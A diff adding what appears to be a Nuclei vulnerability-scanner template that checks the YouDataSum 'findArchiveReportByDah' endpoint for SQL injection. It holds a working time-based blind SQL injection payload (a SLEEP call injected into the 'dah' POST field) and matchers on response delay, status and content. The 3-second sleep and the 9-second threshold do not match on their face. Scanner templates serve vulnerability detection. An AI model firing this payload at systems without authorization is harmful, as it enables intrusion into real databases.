@@ -1,0 +1,29 @@
+id: YouDataSum-findArchiveReportByDah-sqlInjection
+info:
+  name: YouDataSum-findArchiveReportByDah-sqlInjection
+  author: iSee857
+  severity: high
+  description: YouDataSum-findArchiveReportByDah-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dah=0' AND (SELECT 6451 FROM (SELECT(SLEEP(3)))oufm) AND 'lRBm'='lRBm
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 9"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'total'
